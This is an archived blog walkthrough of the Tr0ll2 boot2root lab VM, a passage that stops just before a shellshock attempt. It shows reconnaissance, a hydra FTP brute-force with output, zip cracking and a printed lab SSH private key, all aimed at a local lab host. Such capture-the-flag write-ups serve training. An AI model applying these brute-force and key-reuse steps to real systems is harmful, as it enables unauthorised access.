
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>another troll tamed - solving troll 2 - #!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="foreword Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">another troll tamed - solving troll 2</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-10-10T17:32:35+02:00" pubdate data-updated="true">Oct 10<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>foreword</h2>

<p><a href="">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>

<p>Here is my experience taming the troll, again.</p>

<h2>getting started</h2>

<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-10 06:55 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.101
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.00031s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>Reason: 997 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'>Service Info: Host: Tr0ll<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 15.21 seconds
</span></code></pre></td></tr></table></div></figure>


<p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>

<h2>web server</h2>

<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>

<p><img src="https://i.imgur.com/7lyyzPS.png">
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>

<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/keep_trying
</span><span class='line'>/dont_bother
</span><span class='line'>/noob
</span><span class='line'>/ok_this_is_it
</span></code></pre></td></tr></table></div></figure>


<p>The content served up at these URLs:</p>

<p><img src="https://i.imgur.com/yH4vTKx.png"></p>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>

<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>line in <span class="k">$(</span>cat 200.txt<span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">&quot;==&gt;$line&lt;==&quot;</span> <span class="o">&amp;&amp;</span> wget 192.168.56.101/<span class="nv">$line</span>/cat_the_troll.jpg<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'><span class="o">==</span>&gt;/ok_this_is_it&lt;<span class="o">==</span>
</span><span class='line'>--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
</span><span class='line'>Connecting to 192.168.56.101:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 <span class="o">(</span>15K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>cat_the_troll.jpg.3<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[=======&gt;] 15,831      --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved <span class="o">[</span>15831/15831<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ls -l
</span><span class='line'>total 68
</span><span class='line'>-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 <span class="c">#&lt;---</span>
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
</span></code></pre></td></tr></table></div></figure>


<p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
</span><span class='line'>cmp: EOF on cat_the_troll.jpg
</span></code></pre></td></tr></table></div></figure>


<p>Sweet, so lets print the last line of both and check what the diff is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
</span><span class='line'>8Ã¯Â¿Â½z2Ã¯Â¿Â½Ã¯Â¿Â½pÃ¯Â¿Â½TÃ¯Â¿Â½lj<span class="se">\p</span>Ã¯Â¿Â½Ã¯Â¿Â½?Ã¯Â¿Â½&lt;Ã¯Â¿Â½SÃ¯Â¿Â½Ã›ÂªÃ¯Â¿Â½Ã¯Â¿Â½6Ã¯Â¿Â½#Ã¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½7U yÃ¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½*/ p?E<span class="nv">$Ã</span>¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½%<span class="o">=</span>Ã¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½.Ã¯Â¿Â½BÃ¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½oÃ¯Â¿Â½ES_Ã¯Â¿Â½
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
</span><span class='line'>8Ã¯Â¿Â½z2Ã¯Â¿Â½Ã¯Â¿Â½pÃ¯Â¿Â½TÃ¯Â¿Â½lj<span class="se">\p</span>Ã¯Â¿Â½Ã¯Â¿Â½?Ã¯Â¿Â½&lt;Ã¯Â¿Â½SÃ¯Â¿Â½Ã›ÂªÃ¯Â¿Â½Ã¯Â¿Â½6Ã¯Â¿Â½#Ã¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½7U yÃ¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½*/ p?E<span class="nv">$Ã</span>¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½%<span class="o">=</span>Ã¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½.Ã¯Â¿Â½BÃ¯Â¿Â½Ã¯Â¿Â½Ã¯Â¿Â½oÃ¯Â¿Â½ES_Ã¯Â¿Â½Ã¯Â¿Â½Look Deep within y0ur_self <span class="k">for </span>the answer
</span></code></pre></td></tr></table></div></figure>


<p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>

<p><img src="https://i.imgur.com/oNInvrf.png"></p>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# head answer.txt
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'>QUEK
</span><span class='line'>QUIK
</span><span class='line'><span class="nv">QUJNCg</span><span class="o">==</span>
</span><span class='line'>QUMK
</span><span class='line'><span class="nv">QUNUSAo</span><span class="o">=</span>
</span><span class='line'>QUkK
</span><span class='line'><span class="nv">QUlEUwo</span><span class="o">=</span>
</span><span class='line'>QU0K
</span></code></pre></td></tr></table></div></figure>


<p>Looks a lot like base64 hey? Lets try decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat answer.txt <span class="p">|</span> base64 -d <span class="p">|</span> head
</span><span class='line'>A
</span><span class='line'>A
</span><span class='line'>AA
</span><span class='line'>AB
</span><span class='line'>ABM
</span><span class='line'>AC
</span><span class='line'>ACTH
</span><span class='line'>AI
</span><span class='line'>AIDS
</span><span class='line'>AM
</span></code></pre></td></tr></table></div></figure>


<p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>

<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>

<p>My guess was that this has to be a password for either the FTP or SSH service.</p>

<h2>ftpee</h2>

<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>

<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>

<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr "\"' " '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>

<p>And finally, it was time to let hydra on the loose.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-10-10 08:11:50
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 30 tasks, 1 server, 13689 login tries <span class="o">(</span>l:117/p:117<span class="o">)</span>, ~456 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;&gt;&quot;</span> - 1 of 13689 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;404&quot;</span> - 2 of 13689 <span class="o">[</span>child 1<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;again&quot;</span> - 3 of 13689 <span class="o">[</span>child 2<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;agent&quot;</span> - 4 of 13689 <span class="o">[</span>child 3<span class="o">]</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;Tr0ll&quot;</span> - 10621 of 13689 <span class="o">[</span>child 4<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll2&quot;</span> - 10622 of 13689 <span class="o">[</span>child 8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll_again.jpg&quot;</span> - 10623 of 13689 <span class="o">[</span>child 23<span class="o">]</span>
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 192.168.56.101   login: Tr0ll   password: Tr0ll
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for </span>192.168.56.101 <span class="o">(</span>valid pair found<span class="o">)</span>
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-10-10 08:29:08
</span></code></pre></td></tr></table></div></figure>


<p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
</span><span class='line'>Connected to 192.168.56.101.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay <span class="k">for </span>a <span class="k">while</span>...
</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span></code></pre></td></tr></table></div></figure>


<p>Yay! Progress! Lets take a closer look&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; pas
</span><span class='line'>Passive mode on.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,73,4<span class="o">)</span>
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>
</span><span class='line'>ftp&gt; get lmao.zip
</span><span class='line'><span class="nb">local</span>: lmao.zip remote: lmao.zip
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,105,73<span class="o">)</span>
</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lmao.zip <span class="o">(</span>1474 bytes<span class="o">)</span>.
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs <span class="o">(</span>621.0 kB/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>ftp&gt; bye
</span><span class='line'>221 Goodbye.
</span></code></pre></td></tr></table></div></figure>


<h1>noob key</h1>

<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>

<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# unzip lmao.zip
</span><span class='line'>Archive:  lmao.zip
</span><span class='line'><span class="o">[</span>lmao.zip<span class="o">]</span> noob password: <span class="c">#ItCantReallyBeThisEasyRightLOL</span>
</span><span class='line'>  inflating: noob
</span><span class='line'>
</span><span class='line'>root@kali:~# cat noob
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
</span><span class='line'><span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# chmod 600 noob
</span><span class='line'>root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<h2>shocking isn&rsquo;t it</h2>

<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>

<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>

<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>

